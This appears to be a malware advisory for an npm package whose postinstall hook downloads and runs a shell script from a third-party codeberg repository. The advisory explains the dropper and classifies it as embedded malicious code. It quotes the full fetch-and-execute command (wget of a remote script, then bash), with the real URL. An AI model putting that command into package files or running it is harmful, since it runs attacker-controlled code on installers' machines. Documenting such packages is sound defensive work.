summary: postinstall fetches and executes remote shell script from codeberg.org
details: package.json declares a `postinstall` lifecycle hook that runs `wget https://codeberg.org/atilalogical/worm_teste/raw/branch/main/down_procwork.sh -O d.sh; bash d.sh`. On `npm install`, the installer's machine downloads an unpinned shell script from a mutable `main` branch of a third-party codeberg repository (named `worm_teste`) and executes it under bash. The fetched content is unverified, unauthenticated, and fully controlled by the repository owner, who can change it at any time to deliver arbitrary code. The manifest is otherwise hollow (empty author/description, a nonsensical self-referential dependency on `vkzmn@^1.0.4`), consistent with a disposable dropper publish whose only purpose is the install-time fetch-and-exec.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
